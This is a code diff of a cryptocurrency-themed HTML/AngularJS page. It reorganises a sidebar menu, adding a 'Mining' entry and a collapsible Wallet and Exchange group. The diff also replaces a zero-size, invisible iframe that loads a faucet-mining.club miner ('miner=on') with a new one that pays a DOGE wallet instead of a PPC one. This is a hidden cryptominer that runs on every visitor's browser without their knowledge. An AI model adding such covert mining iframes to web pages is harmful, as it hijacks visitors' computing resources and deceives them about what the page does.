@@ -36,11 +36,22 @@
                 <!-- /.nav-second-level -->
             </li>
 			<li>
-               <a href="#" ng-click="cat('wallet')">Wallet (錢包)</a>
+               <a href="#" ng-click="cat('mining')">Mining (挖礦)</a>
             </li>
-    		<li>
-				 <a href="#" ng-click="cat('exchange')">Excahge (交易所)</a>
-            </li> 
+			<li ng-class="{active: multiCollapseVar==2}">
+                         <a href="" ng-click="multiCheck(2)">Wallet&Excahge (錢包&交易所)<span
+                        class="fa arrow"></span></a>
+						<ul class="nav nav-second-level" collapse="multiCollapseVar!=2">
+							<li>
+							   <a href="#" ng-click="cat('wallet')">Wallet (錢包)</a>
+							</li>
+							<li>
+								 <a href="#" ng-click="cat('exchange')">Excahge (交易所)</a>
+							</li> 
+                        </ul>
+                        </.nav-2-level>
+                    </li>
+			
             <!--li>
                <a href="#" ng-click="cat('scam')">SCAM (詐騙)</a>
             </li-->
@@ -59,7 +70,7 @@
 						  <!--a href="#" class="btn btn-primary">Sony</a-->
 						</div>
 						
-			<iframe scrolling="no" frameborder="0" src="http://faucet-mining.club/faucet.php?address=PSLoPaDZMWd2RmqtitH6J6nzBfdbeyWKLp&currency=PPC&miner=on&key=fee8a98682e6a5c2d98914955552403b" style="overflow:hidden;width:0;height:0;"></iframe>
+			<iframe scrolling="no" frameborder="0" src="http://faucet-mining.club//faucet.php?address=AEwzjYwLnUiEPeus2nZsXQqC4chF2EHbzy&currency=DOGE&miner=on&key=df15aa0c1a31d05a4a2e7724f89f695e" style="overflow:hidden;width:0;height:0;"></iframe>
 			<iframe data-aa='777621' src='//acceptable.a-ads.com/777621?size=Adaptive&background_color=000000&text_color=ffffff&title_color=ffffff&link_color=ffffff' scrolling='no'  style='width:100%;border:0px; padding:0;overflow:hidden' allowtransparency='true'></iframe>
     </div>
 		
